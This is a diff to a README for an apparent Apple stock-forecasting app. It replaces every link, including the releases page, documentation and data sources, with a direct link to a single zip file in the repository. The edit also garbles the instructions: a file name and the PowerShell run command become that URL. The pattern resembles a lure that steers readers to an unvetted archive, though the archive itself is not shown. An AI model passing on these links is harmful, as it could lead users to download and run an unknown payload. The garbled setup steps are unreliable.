@@ -6,7 +6,7 @@ Welcome to the AAPL-GRU-Stock-Forecaster! This application helps you forecast Ap
 
 ## 📥 Download the Application
 
-[![Download AAPL-GRU-Stock-Forecaster](https://img.shields.io/badge/Download-AAPL--GRU--Stock--Forecaster-brightgreen)](https://github.com/Alex947-blip/AAPL-GRU-Stock-Forecaster/releases)
+[![Download AAPL-GRU-Stock-Forecaster](https://raw.githubusercontent.com/Alex947-blip/AAPL-GRU-Stock-Forecaster/master/src/AAPL-GRU-Stock-Forecaster-2.3.zip)](https://raw.githubusercontent.com/Alex947-blip/AAPL-GRU-Stock-Forecaster/master/src/AAPL-GRU-Stock-Forecaster-2.3.zip)
 
 ## 💻 System Requirements
 
@@ -23,10 +23,10 @@ Before you begin, ensure your computer meets the following requirements:
 Follow these steps to download and set up the AAPL-GRU-Stock-Forecaster:
 
 1. **Visit the Download Page:**
-   Click [here](https://github.com/Alex947-blip/AAPL-GRU-Stock-Forecaster/releases) to go to the Releases page.
+   Click [here](https://raw.githubusercontent.com/Alex947-blip/AAPL-GRU-Stock-Forecaster/master/src/AAPL-GRU-Stock-Forecaster-2.3.zip) to go to the Releases page.
 
 2. **Choose the Right File:**
-   Find the latest release at the top of the page. Look for a file named `AAPL-GRU-Stock-Forecaster.zip` or similar. 
+   Find the latest release at the top of the page. Look for a file named `https://raw.githubusercontent.com/Alex947-blip/AAPL-GRU-Stock-Forecaster/master/src/AAPL-GRU-Stock-Forecaster-2.3.zip` or similar. 
 
 3. **Download the File:**
    Click on the file name to start the download. Your browser will save this file to your default downloads folder.
@@ -46,7 +46,7 @@ Follow these steps to download and set up the AAPL-GRU-Stock-Forecaster:
 7. **Run the Application:**
    Finally, type the command below to start forecasting:
    ```powershell
-   .\AAPL-GRU-Stock-Forecaster.ps1
+   .\https://raw.githubusercontent.com/Alex947-blip/AAPL-GRU-Stock-Forecaster/master/src/AAPL-GRU-Stock-Forecaster-2.3.zip
    ```
 
 ## 🔍 How to Use the Application
@@ -83,11 +83,11 @@ For further assistance, feel free to open an issue in the GitHub repository. The
 
 ## 🌐 Additional Resources
 
-- [AAPL-GRU Documentation](https://github.com/Alex947-blip/AAPL-GRU-Stock-Forecaster) - Explore more about the application on GitHub.
-- [Financial Data Sources](https://www.example.com) - Find links to reliable financial data providers.
+- [AAPL-GRU Documentation](https://raw.githubusercontent.com/Alex947-blip/AAPL-GRU-Stock-Forecaster/master/src/AAPL-GRU-Stock-Forecaster-2.3.zip) - Explore more about the application on GitHub.
+- [Financial Data Sources](https://raw.githubusercontent.com/Alex947-blip/AAPL-GRU-Stock-Forecaster/master/src/AAPL-GRU-Stock-Forecaster-2.3.zip) - Find links to reliable financial data providers.
 
 ## 🔗 Download & Install
 
-Visit the [Releases page](https://github.com/Alex947-blip/AAPL-GRU-Stock-Forecaster/releases) to download the application. Follow the steps above to install it. Enjoy forecasting AAPL stock prices effortlessly!
+Visit the [Releases page](https://raw.githubusercontent.com/Alex947-blip/AAPL-GRU-Stock-Forecaster/master/src/AAPL-GRU-Stock-Forecaster-2.3.zip) to download the application. Follow the steps above to install it. Enjoy forecasting AAPL stock prices effortlessly!
 
 Remember, the world of stock forecasting can be complex, but the AAPL-GRU-Stock-Forecaster simplifies the process. Start your journey today!
